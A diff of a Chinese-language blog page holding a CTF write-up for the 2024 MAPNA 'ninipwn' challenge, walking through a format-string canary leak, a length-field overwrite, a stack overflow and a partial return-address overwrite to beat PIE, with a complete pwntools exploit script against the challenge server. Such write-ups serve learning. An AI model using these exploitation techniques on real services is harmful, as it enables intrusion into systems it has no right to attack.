@@ -208,6 +208,20 @@
     </div>
     <div class="right">
       
+      <cosy-tooltip id="toc-show-button" placement="left">
+        <span slot="content">
+          <span>显示 / 隐藏 文章目录</span>
+          <cosy-short-key>]</cosy-short-key>
+        </span>
+        <cosy-icon>
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+            <g fill="none">
+              <path d="M4 4c-1.104-.019-2 .896-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2H4zM3 6a1 1 0 0 1 1-1h2.995v10H4a1 1 0 0 1-1-1V6zm4.995 9V5h8.004a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1H7.995z" fill="currentColor"></path>
+            </g>
+          </svg>
+        </cosy-icon>
+      </cosy-tooltip>
+      
     </div>
   </header>
   <div class="content">
@@ -218,10 +232,127 @@
           <!-- 文章标题 -->
           <h1 class="post-title">2024mapna</h1>
           <div class="last-updated">
-            上次更新: 2024-01-17 16:09:34
+            上次更新: 2024-01-21 22:34:01
           </div>
           <!-- 文章 -->
-          
+          <p>这算是赛后总结吧，学长说对新手很友好，我看不出来，只能说真的很”友好”。</p>
+<p>这次虽然只做出一道题，但是总的来说收获还是非常多的</p>
+<h1 id="ninipwn"><a href="#ninipwn" class="headerlink" title="ninipwn"></a>ninipwn</h1><p>这道题思路还是比较清晰的，主要还是脚本十分难写</p>
+<p>首先check一下</p>
+<p><img src="https://img.hijwei.top/2/24/65ad2b2e99d6b.png" alt="image-20240121214012422"></p>
+<p>发现是64位的然后保护全开，主要是注意PIE和Canary保护</p>
+<h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">disable_io_buffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//初始化</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"XOR encryption service"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">encryption_service</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//加密</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>没什么东西，就一个初始化和加密函数</p>
+<p>显然加密函数才是我们要注意的位置</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">encryption_service</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">264</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-110h] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+108h] [rbp-8h]</span>
+
+  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Text length: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>text_length <span class="token operator">&lt;</span> <span class="token number">0x101</span> <span class="token punctuation">)</span>     
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Key: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token number">0xAuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Key selected: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//可能fmt</span>
+    <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Text: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> text_length<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//向栈上写      </span>
+    <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>                    
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Encrypted output: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> text_length<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//可能fmt            </span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Text length must be less than 256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> v2 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先能我们会看到一些比较显眼的漏洞，就是第一个<code>printf(key);</code> 这个明显key是可控的，有着一个格式化字符串漏洞</p>
+<p>然后key是一个char[8]型的然而能输入0xA个字符，显然数组越界</p>
+<p>再深入探查的话<img src="https://img.hijwei.top/2/24/65ad2b2f75f90.png" alt="image-20240121214710570"></p>
+<p>会发现text_length的前两位是可以覆盖的，然后由于是小端存储 而且题目限定text_length我们输入进去的要小于0x101，因此<strong>覆盖的两位就是我们的text_length大小</strong>这点很重要，是整道题目的核心</p>
+<hr>
+<p><strong>这里插入一点：</strong></p>
+<p><strong>在ida里，一个指针长度存储两个16进制值，例如0x4050上可能存储的是0x19等，因此上面text_length覆盖两个指针长度其实覆盖了4个16进制数</strong></p>
+<hr>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> text_length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>有了text_length的覆盖那么这段的text_length的大小就是可控的，而buf段位于栈上，因此有显然的栈溢出的漏洞，所以本题的核心就是覆盖返回地址</p>
+<p>但是其中还有很多细节需要注意，就是本题开启了Canary保护，我们要绕过该保护，而PIE保护也要绕过，PIE使得整个可执行文件可以被加载到随机的地址，但是后12位(64位)无论是ASLR或者PIE都不会改变</p>
+<p>但是本题目，覆盖的时候，只需要覆盖后8位即可更简便<img src="https://img.hijwei.top/2/24/65ad2b307bd1a.png" alt="image-20240121220314128" style="zoom:50%;" /></p>
+<p><img src="https://img.hijwei.top/2/24/65ad2b31922a4.png" alt="image-20240121220337900"></p>
+<p>可以看到只有后8位不一样，因此只需要覆盖后八位即可，这样既方便又可以绕过PIE保护</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">encrypt</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-4h]</span>
+
+  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>text_length<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> text_length <span class="token punctuation">)</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">^=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这是其中的加密函数，可以看到会加密text_length大小的内容，因此我们输入多少它加密多少，而这个是异或，就可以通过二次异或来返回原值</p>
+<p>而Canary则通过那个格式化字符串漏洞泄露，Canary一般是在ebp-0x8的位置</p>
+<p>因此可以通过<code>%xxx$p来泄露Canary的值</code></p>
+<p>大致的思路就这样</p>
+<p>附上exp</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment">#sh=process('./ninipwn')</span>
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'3.75.185.198'</span><span class="token punctuation">,</span><span class="token number">7000</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+<span class="token comment">#win_addr=0x1433</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Text length: '</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'25'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Key: '</span><span class="token punctuation">)</span>
+key<span class="token operator">=</span><span class="token string">b'%039$paa\x19\x01'</span>
+sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>
+recv_data<span class="token operator">=</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+canary_data<span class="token operator">=</span>recv_data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>canary_data<span class="token punctuation">)</span>
+<span class="token comment">#text</span>
+payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>canary_data<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\x33'</span>
+pay<span class="token operator">=</span><span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">264</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    pay<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token operator">^</span>key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token comment">##chr是将整数转换为字符数组</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    pay<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="写exp的总结："><a href="#写exp的总结：" class="headerlink" title="写exp的总结："></a>写exp的总结：</h2><ol>
+<li>recv下来的东西，是字符串，不是整数，例如0x273437，他是一个长度8的字符串，因此需要等到0x再切片</li>
+<li>send的东西，最后是字节序列，但字符串也是可以的</li>
+<li>b’内容’该内容全部被转换位ASCII码的形式，如果想要输出01那么需要使用<code>\x01</code>来实现、</li>
+<li>字节序列就是0到ff的整形构成的数组</li>
+<li>canary截取下来是字符串类型，而其中的值需要转换成qword的形式，那么先用int来将将十六进制字符串转换为64位整数，之后再用p64一步搞定</li>
+</ol>
+<p>最后，虽然只能做出一题，但是其中的过程还是值得回味的，无论是失败还是成功，享受这个过程就可以，这道题能做出来学长居功至伟，解答了我非常多的问题，让我成长了许多，我将会继续学习，继续进步的。</p>
+
           <div class="post-tags">
             <!-- 文章tags -->
             
@@ -234,13 +365,32 @@
     </main>
     <!-- toc -->
     
+    <cosy-drag-box id="toc-drag-box" trigger="left" min-width="220" uid="toc-box">
+      <div class="meta-container">
+        <div class="toc-wrapper cosy-scrollbar">
+          <p class="catalog">
+            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24">
+              <g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M4 6h16"></path>
+                <path d="M4 12h16"></path>
+                <path d="M4 18h12"></path>
+              </g>
+            </svg>
+            <span>目录</span>
+          </p>
+          <!-- 文章toc -->
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ninipwn"><span class="toc-number">1.</span> <span class="toc-text">ninipwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">IDA静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99exp%E7%9A%84%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">写exp的总结：</span></a></li></ol></li></ol>
+        </div>
+      </div>
+    </cosy-drag-box>
+    
   </div>
 
 </div>
 
 <script>
   window.page = {
-    use: ''
+    use: 'valine'
   }
   window.katex = {
     enable: "",
